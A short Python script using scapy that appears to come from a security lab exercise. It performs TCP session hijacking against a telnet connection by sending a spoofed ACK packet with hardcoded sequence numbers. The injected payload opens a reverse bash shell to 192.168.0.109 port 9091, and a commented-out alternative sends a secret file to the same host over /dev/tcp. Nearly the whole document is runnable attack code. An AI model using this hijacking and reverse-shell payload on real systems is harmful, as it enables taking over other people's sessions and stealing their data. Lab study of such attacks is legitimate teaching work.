#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")
IPLayer = IP(src="192.168.0.111", dst="192.168.0.102")
TCPLayer = TCP(sport=44768, dport=23, flags="A", seq=245736681, ack=931851152)
# Data = "\r cat /home/seed/secret > /dev/tcp/192.168.0.109/9091 \r"
Data = "\r /bin/bash -i > /dev/tcp/192.168.0.109/9091 2>&1 0<&1 \r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)